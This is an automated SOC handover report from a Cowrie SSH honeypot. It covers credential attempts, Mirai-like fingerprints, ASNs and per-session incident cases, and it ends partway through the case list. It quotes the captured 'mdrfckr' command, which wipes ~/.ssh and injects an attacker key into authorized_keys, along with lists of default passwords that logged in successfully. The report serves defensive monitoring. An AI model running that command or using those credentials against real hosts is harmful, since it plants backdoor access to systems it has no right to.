# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-08 |
| **Generated At** | 2026-08-08T12:56:43Z |
| **Shift Time** | 12:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **125** |
| Confirmed Threats | **108** |
| False Positives Filtered | **17** (13.6%) |
| Unique Attacker IPs | **83** |
| Countries of Origin | **27** |
| High Severity Cases | **57** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **68** |
| Malware Samples Analyzed | **3** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **79** |
| Unique Credential Pairs | **34** |
| Unique Usernames | **17** |
| Unique Passwords | **31** |
| Successful Auth Pairs | **63** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 17 |
| `admin` | 12 |
| `config` | 9 |
| `support` | 8 |
| `default` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `blahblah` | 6 |
| `qwerty12345` | 5 |
| `default0` | 4 |
| `support` | 4 |
| `345gs5662d34` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `blahblah` | 6 |
| `config` | `qwerty12345` | 5 |
| `default` | `default0` | 4 |
| `support` | `support` | 4 |
| `345gs5662d34` | `345gs5662d34` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@$$w0rd` | `117.69.255.239` | 2026-08-08T08:57:30 |
| `root` | `P@$$w0rd` | `112.26.101.76` | 2026-08-08T08:57:40 |
| `default` | `default0` | `10.0.0.73` | 2026-08-08T08:59:24 |
| `support` | `support` | `10.0.0.73` | 2026-08-08T08:59:26 |
| `default` | `default0` | `121.189.226.81` | 2026-08-08T09:00:59 |
| `MikroTikSystem` | `2a5Z8DOgsrugkLkmm7V` | `10.0.0.73` | 2026-08-08T09:08:49 |
| `config` | `qwerty12345` | `221.182.185.190` | 2026-08-08T09:12:48 |
| `config` | `qwerty12345` | `45.118.136.243` | 2026-08-08T09:12:57 |
| `dasusr1` | `1` | `165.232.164.223` | 2026-08-08T09:13:15 |
| `345gs5662d34` | `345gs5662d34` | `165.232.164.223` | 2026-08-08T09:13:19 |
| `dasusr1` | `3245gs5662d34` | `165.232.164.223` | 2026-08-08T09:13:21 |
| `support` | `support00` | `10.0.0.73` | 2026-08-08T09:14:29 |
| `thomas` | `thomas123` | `95.255.158.96` | 2026-08-08T09:15:47 |
| `345gs5662d34` | `345gs5662d34` | `95.255.158.96` | 2026-08-08T09:15:49 |
| `config` | `qwerty12345` | `61.186.136.36` | 2026-08-08T09:15:50 |
| `thomas` | `3245gs5662d34` | `95.255.158.96` | 2026-08-08T09:15:50 |
| `config` | `qwerty12345` | `111.70.11.78` | 2026-08-08T09:16:04 |
| `config` | `qwerty12345` | `10.0.0.73` | 2026-08-08T09:16:09 |
| `default` | `default0` | `222.174.184.86` | 2026-08-08T09:17:21 |
| `support` | `support` | `176.53.159.196` | 2026-08-08T09:27:39 |
| `MikroTikSystem` | `2a5Z8DOgsrugkLkmm7V` | `222.117.176.58` | 2026-08-08T09:27:51 |
| `MikroTikSystem` | `2a5Z8DOgsrugkLkmm7V` | `81.214.75.248` | 2026-08-08T09:27:58 |
| `admin` | `admin123456` | `1.212.225.99` | 2026-08-08T09:35:33 |
| `admin` | `admin123456` | `70.91.135.181` | 2026-08-08T09:35:40 |
| `nobody` | `qwerty` | `103.31.39.188` | 2026-08-08T09:37:27 |
| `blank` | `blank2013` | `10.0.0.73` | 2026-08-08T09:39:18 |
| `admin` | `w5basAtr` | `10.0.0.73` | 2026-08-08T09:43:22 |
| `pi` | `raspberryraspberry993311` | `125.227.156.55` | 2026-08-08T09:51:57 |
| `pi` | `raspberry` | `125.227.156.55` | 2026-08-08T09:51:57 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-08T09:53:20 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-08T09:53:20 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-08T09:53:27 |
| `supervisor` | `supervisor2011` | `201.28.237.90` | 2026-08-08T10:01:53 |
| `supervisor` | `supervisor2011` | `10.0.0.73` | 2026-08-08T10:02:16 |
| `nobody` | `qwerty` | `24.142.170.231` | 2026-08-08T10:06:33 |
| `nobody` | `qwerty` | `195.158.26.59` | 2026-08-08T10:06:45 |
| `support` | `root123456789` | `10.0.0.73` | 2026-08-08T10:08:31 |
| `support` | `root123456789` | `62.201.253.23` | 2026-08-08T10:10:15 |
| `user` | `a1a2a3` | `88.84.209.146` | 2026-08-08T10:11:46 |
| `root` | `blahblah` | `10.0.0.73` | 2026-08-08T10:18:01 |
| `admin` | `admin2010` | `31.41.84.98` | 2026-08-08T10:21:56 |
| `admin` | `admin2010` | `123.52.202.92` | 2026-08-08T10:22:09 |
| `admin` | `admin2010` | `179.184.218.49` | 2026-08-08T10:25:03 |
| `admin` | `admin2010` | `111.70.3.108` | 2026-08-08T10:25:12 |
| `root` | `﻿------fuck------` | `111.42.60.82` | 2026-08-08T10:29:01 |
| `root` | `blahblah` | `186.215.107.189` | 2026-08-08T10:36:53 |
| `root` | `blahblah` | `177.159.150.111` | 2026-08-08T10:37:05 |
| `root` | `blahblah` | `117.248.201.39` | 2026-08-08T10:37:06 |
| `root` | `blahblah` | `210.0.90.82` | 2026-08-08T10:37:15 |
| `bruno` | `bruno` | `54.38.180.48` | 2026-08-08T10:40:11 |
| `345gs5662d34` | `345gs5662d34` | `54.38.180.48` | 2026-08-08T10:40:13 |
| `bruno` | `3245gs5662d34` | `54.38.180.48` | 2026-08-08T10:40:14 |
| `admin` | `lamer2398` | `10.0.0.73` | 2026-08-08T10:42:51 |
| `admin` | `admin` | `177.5.74.41` | 2026-08-08T10:43:12 |
| `reza` | `123456` | `172.190.24.225` | 2026-08-08T10:44:07 |
| `345gs5662d34` | `345gs5662d34` | `172.190.24.225` | 2026-08-08T10:44:08 |
| `reza` | `3245gs5662d34` | `172.190.24.225` | 2026-08-08T10:44:08 |
| `admin` | `lamer2398` | `213.230.64.246` | 2026-08-08T10:44:27 |
| `admin` | `lamer2398` | `124.67.120.106` | 2026-08-08T10:44:36 |
| `config` | `config2004` | `163.223.244.3` | 2026-08-08T10:48:14 |
| `config` | `config2004` | `177.174.89.99` | 2026-08-08T10:48:22 |
| `config` | `config2004` | `10.0.0.73` | 2026-08-08T10:48:39 |
| `unknown` | `webmaster` | `10.0.0.73` | 2026-08-08T10:52:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **125** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 35 |
| libssh | 19 |
| Paramiko (Python) | 10 |
| Go SSH scanner | 3 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 31 | 31 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `a2de0f306611...` | Mirai/variant | 8 | 1 |
| `ae8bd7dd0997...` | Modern SSH client | 4 | 1 |
| `a704be057881...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 31 | 31 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `ae8bd7dd0997...` | OpenSSH | 4 | 1 | Modern SSH client |
| `a704be057881...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.232.164.223`, `172.190.24.225`, `54.38.180.48`, `95.255.158.96`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **83** |
| Unique ASNs | **60** |
| High-Risk ASNs | **49** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS48721` | Flyservers S.A. | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (57)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-95255b66367a

| Field | Detail |
|---|---|
| **Source IP** | `117.69.255[.]239` |
| **First Seen** | 2026-08-08 08:57 |
| **Last Seen** | 2026-08-08 08:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:57:26` | `cowrie.session.connect` |
| `2026-08-08 08:57:27` | `cowrie.client.version` |
| `2026-08-08 08:57:27` | `cowrie.client.kex` |
| `2026-08-08 08:57:30` | `cowrie.login.success` |
| `2026-08-08 08:57:31` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.69.255[.]239` to AbuseIPDB if not already reported
- [ ] Block `117.69.255[.]239` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-064481eee3d1

| Field | Detail |
|---|---|
| **Source IP** | `112.26.101[.]76` |
| **First Seen** | 2026-08-08 08:57 |
| **Last Seen** | 2026-08-08 08:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:57:37` | `cowrie.session.connect` |
| `2026-08-08 08:57:37` | `cowrie.client.version` |
| `2026-08-08 08:57:37` | `cowrie.client.kex` |
| `2026-08-08 08:57:40` | `cowrie.login.success` |
| `2026-08-08 08:57:40` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.101[.]76` to AbuseIPDB if not already reported
- [ ] Block `112.26.101[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-982c360228a1

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-08-08 09:00 |
| **Last Seen** | 2026-08-08 09:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:00:56` | `cowrie.session.connect` |
| `2026-08-08 09:00:57` | `cowrie.client.version` |
| `2026-08-08 09:00:57` | `cowrie.client.kex` |
| `2026-08-08 09:00:59` | `cowrie.login.success` |
| `2026-08-08 09:00:59` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5657cb634ce

| Field | Detail |
|---|---|
| **Source IP** | `221.182.185[.]190` |
| **First Seen** | 2026-08-08 09:12 |
| **Last Seen** | 2026-08-08 09:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:12:45` | `cowrie.session.connect` |
| `2026-08-08 09:12:45` | `cowrie.client.version` |
| `2026-08-08 09:12:45` | `cowrie.client.kex` |
| `2026-08-08 09:12:48` | `cowrie.login.success` |
| `2026-08-08 09:12:48` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.182.185[.]190` to AbuseIPDB if not already reported
- [ ] Block `221.182.185[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35fe4267e245

| Field | Detail |
|---|---|
| **Source IP** | `45.118.136[.]243` |
| **First Seen** | 2026-08-08 09:12 |
| **Last Seen** | 2026-08-08 09:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:12:54` | `cowrie.session.connect` |
| `2026-08-08 09:12:55` | `cowrie.client.version` |
| `2026-08-08 09:12:55` | `cowrie.client.kex` |
| `2026-08-08 09:12:57` | `cowrie.login.success` |
| `2026-08-08 09:12:58` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.118.136[.]243` to AbuseIPDB if not already reported
- [ ] Block `45.118.136[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89e2589dc0c7

| Field | Detail |
|---|---|
| **Source IP** | `165.232.164[.]223` |
| **First Seen** | 2026-08-08 09:13 |
| **Last Seen** | 2026-08-08 09:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:13:14` | `cowrie.session.connect` |
| `2026-08-08 09:13:14` | `cowrie.client.version` |
| `2026-08-08 09:13:14` | `cowrie.client.kex` |
| `2026-08-08 09:13:15` | `cowrie.login.success` |
| `2026-08-08 09:13:16` | `cowrie.session.params` |
| `2026-08-08 09:13:16` | `cowrie.command.input` |
| `2026-08-08 09:13:16` | `cowrie.command.failed` |
| `2026-08-08 09:13:17` | `cowrie.log.closed` |
| `2026-08-08 09:13:18` | `cowrie.session.params` |
| `2026-08-08 09:13:18` | `cowrie.command.input` |
| `2026-08-08 09:13:18` | `cowrie.session.file_download` |
| `2026-08-08 09:13:18` | `cowrie.log.closed` |
| `2026-08-08 09:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.164[.]223` to AbuseIPDB if not already reported
- [ ] Block `165.232.164[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc4fc2b7084b

| Field | Detail |
|---|---|
| **Source IP** | `165.232.164[.]223` |
| **First Seen** | 2026-08-08 09:13 |
| **Last Seen** | 2026-08-08 09:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:13:18` | `cowrie.session.connect` |
| `2026-08-08 09:13:18` | `cowrie.client.version` |
| `2026-08-08 09:13:18` | `cowrie.client.kex` |
| `2026-08-08 09:13:19` | `cowrie.login.success` |
| `2026-08-08 09:13:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.164[.]223` to AbuseIPDB if not already reported
- [ ] Block `165.232.164[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36814b4b89fa

| Field | Detail |
|---|---|
| **Source IP** | `165.232.164[.]223` |
| **First Seen** | 2026-08-08 09:13 |
| **Last Seen** | 2026-08-08 09:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:13:20` | `cowrie.session.connect` |
| `2026-08-08 09:13:20` | `cowrie.client.version` |
| `2026-08-08 09:13:20` | `cowrie.client.kex` |
| `2026-08-08 09:13:21` | `cowrie.login.success` |
| `2026-08-08 09:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.164[.]223` to AbuseIPDB if not already reported
- [ ] Block `165.232.164[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68624911f6de

| Field | Detail |
|---|---|
| **Source IP** | `61.186.136[.]36` |
| **First Seen** | 2026-08-08 09:15 |
| **Last Seen** | 2026-08-08 09:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:15:46` | `cowrie.session.connect` |
| `2026-08-08 09:15:46` | `cowrie.client.version` |
| `2026-08-08 09:15:46` | `cowrie.client.kex` |
| `2026-08-08 09:15:50` | `cowrie.login.success` |
| `2026-08-08 09:15:51` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.186.136[.]36` to AbuseIPDB if not already reported
- [ ] Block `61.186.136[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-360d427a3886

| Field | Detail |
|---|---|
| **Source IP** | `95.255.158[.]96` |
| **First Seen** | 2026-08-08 09:15 |
| **Last Seen** | 2026-08-08 09:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:15:46` | `cowrie.session.connect` |
| `2026-08-08 09:15:46` | `cowrie.client.version` |
| `2026-08-08 09:15:46` | `cowrie.client.kex` |
| `2026-08-08 09:15:47` | `cowrie.login.success` |
| `2026-08-08 09:15:48` | `cowrie.session.params` |
| `2026-08-08 09:15:48` | `cowrie.command.input` |
| `2026-08-08 09:15:48` | `cowrie.command.failed` |
| `2026-08-08 09:15:48` | `cowrie.log.closed` |
| `2026-08-08 09:15:49` | `cowrie.session.params` |
| `2026-08-08 09:15:49` | `cowrie.command.input` |
| `2026-08-08 09:15:49` | `cowrie.session.file_download` |
| `2026-08-08 09:15:49` | `cowrie.log.closed` |
| `2026-08-08 09:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.255.158[.]96` to AbuseIPDB if not already reported
- [ ] Block `95.255.158[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4f54f01b820

| Field | Detail |
|---|---|
| **Source IP** | `95.255.158[.]96` |
| **First Seen** | 2026-08-08 09:15 |
| **Last Seen** | 2026-08-08 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:15:49` | `cowrie.session.connect` |
| `2026-08-08 09:15:49` | `cowrie.client.version` |
| `2026-08-08 09:15:49` | `cowrie.client.kex` |
| `2026-08-08 09:15:49` | `cowrie.login.success` |
| `2026-08-08 09:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.255.158[.]96` to AbuseIPDB if not already reported
- [ ] Block `95.255.158[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b62eccb0564c

| Field | Detail |
|---|---|
| **Source IP** | `95.255.158[.]96` |
| **First Seen** | 2026-08-08 09:15 |
| **Last Seen** | 2026-08-08 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:15:50` | `cowrie.session.connect` |
| `2026-08-08 09:15:50` | `cowrie.client.version` |
| `2026-08-08 09:15:50` | `cowrie.client.kex` |
| `2026-08-08 09:15:50` | `cowrie.login.success` |
| `2026-08-08 09:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.255.158[.]96` to AbuseIPDB if not already reported
- [ ] Block `95.255.158[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0d34eae6091

| Field | Detail |
|---|---|
| **Source IP** | `111.70.11[.]78` |
| **First Seen** | 2026-08-08 09:16 |
| **Last Seen** | 2026-08-08 09:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:16:01` | `cowrie.session.connect` |
| `2026-08-08 09:16:02` | `cowrie.client.version` |
| `2026-08-08 09:16:02` | `cowrie.client.kex` |
| `2026-08-08 09:16:04` | `cowrie.login.success` |
| `2026-08-08 09:16:05` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.11[.]78` to AbuseIPDB if not already reported
- [ ] Block `111.70.11[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-232ba771020f

| Field | Detail |
|---|---|
| **Source IP** | `222.174.184[.]86` |
| **First Seen** | 2026-08-08 09:17 |
| **Last Seen** | 2026-08-08 09:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:17:17` | `cowrie.session.connect` |
| `2026-08-08 09:17:18` | `cowrie.client.version` |
| `2026-08-08 09:17:18` | `cowrie.client.kex` |
| `2026-08-08 09:17:21` | `cowrie.login.success` |
| `2026-08-08 09:17:21` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.174.184[.]86` to AbuseIPDB if not already reported
- [ ] Block `222.174.184[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48bcade2ac65

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-08 09:27 |
| **Last Seen** | 2026-08-08 09:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:27:39` | `cowrie.session.connect` |
| `2026-08-08 09:27:39` | `cowrie.client.version` |
| `2026-08-08 09:27:39` | `cowrie.client.kex` |
| `2026-08-08 09:27:39` | `cowrie.login.success` |
| `2026-08-08 09:27:39` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:27:39` | `cowrie.direct-tcpip.data` |
| `2026-08-08 09:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
